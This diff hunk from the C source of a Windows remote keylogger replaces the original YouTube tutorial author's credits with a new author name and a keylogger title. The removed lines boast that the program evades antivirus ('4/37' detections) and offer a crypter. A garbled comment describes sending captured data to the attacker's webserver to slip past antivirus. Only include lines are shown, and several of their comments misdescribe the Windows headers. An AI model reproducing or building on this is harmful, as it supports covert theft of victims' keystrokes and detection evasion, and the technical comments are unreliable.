@@ -11,20 +11,10 @@
     small by sending it through the internet tunnel forwarded on the your hostname for
     your webserver to add in file size limited access avoidability to the Anti virus */
      
-    // Written by: NeroX (aka PROgrammarTutorials)
-    // Date: 05/15/13
-    // Purpose: Youtube Video (Hacking Series)
-    // You can also try to crypt the server but I cannot garuntee it will work
-    // Although you don't even need to crypt it. The scan results were 4/37
-    // So it is pretty good on it's own without any encryption
-    // If you want me to crypt it, I can make a video on how to make a crypter for this server
-    // Just pm me on facebook or youtube if you need help, or interested in a crypter for this
-     
-    // Facebook Profile: https://www.facebook.com/Synchr0n1zeD?ref=tn_tnmn
-    // Youtube Channel: http://www.youtube.com/user/PROgrammarTutorials?feature=watch
-    // ^ P.s Many useful things on my channel so be sure to check it out, and subscribe
-     
-    #include <windows.h> // windows api
+    // Written by: Phyre_Byte
+    // Date Written: 08/12/13
+    // Title: R7_Remote-Keylogger
+    #include <windows.h> // Native windows api
     #include <winuser.h> // grants registry permission on remote machine
     #include <fstream.h> // creates a text file on your webserver
     #include <wininet.h> // socket protocol transmission or connection
